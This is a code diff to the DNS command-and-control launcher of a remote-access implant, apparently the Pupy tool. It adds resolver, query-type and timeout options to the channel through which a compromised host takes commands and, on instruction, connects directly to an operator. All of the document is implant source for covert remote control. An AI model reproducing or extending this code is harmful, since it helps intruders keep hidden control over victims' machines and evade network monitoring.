@@ -34,7 +34,7 @@ from network.lib import getLogger
 logger = getLogger('dnscnc')
 
 class DNSCommandClientLauncher(DnsCommandsClient):
-    def __init__(self, domain):
+    def __init__(self, domain, ns=None, qtype='A', ns_timeout=3):
         self.stream = None
         self.commands = []
         self.lock = Lock()
@@ -48,7 +48,7 @@ class DNSCommandClientLauncher(DnsCommandsClient):
             credentials = Credentials()
             key = credentials['DNSCNC_PUB_KEY']
 
-        DnsCommandsClient.__init__(self, domain, key=key)
+        DnsCommandsClient.__init__(self, domain, key, ns, qtype, ns_timeout=ns_timeout)
 
     def on_session_established(self):
         import pupy
@@ -209,10 +209,29 @@ class DNSCncLauncher(BaseLauncher):
                'you should properly setup NS first. Port is NOT supported)'
         )
 
+        self.arg_parser.add_argument(
+            '--ns', help='DNS server (will use internal DNS library)'
+        )
+
+        self.arg_parser.add_argument(
+            '--ns-timeout', help='DNS query timeout (only when internal DNS library used)',
+            default=3, type=int,
+        )
+
+        self.arg_parser.add_argument(
+            '--qtype',
+            choices=['A'], default='A',
+            help='DNS query type (For now only A supported)'
+        )
+
     def parse_args(self, args):
         self.args = self.arg_parser.parse_args(args)
         self.set_host(self.args.domain)
         self.set_transport(None)
+
+        self.ns = self.args.ns
+        self.ns_timeout = self.args.ns_timeout
+        self.qtype = self.args.qtype
 
     def try_direct_connect(self, command):
         _, host, port, transport, _ = command
@@ -298,7 +317,9 @@ class DNSCncLauncher(BaseLauncher):
         if self.args is None:
             raise LauncherError('parse_args needs to be called before iterate')
 
-        dnscnc = DNSCommandClientLauncher(self.host)
+        dnscnc = DNSCommandClientLauncher(
+            self.host, self.ns, self.qtype, self.ns_timeout)
+
         dnscnc.daemon = True
 
         logger.info('Activating CNC protocol. Domain: {}'.format(self.host))
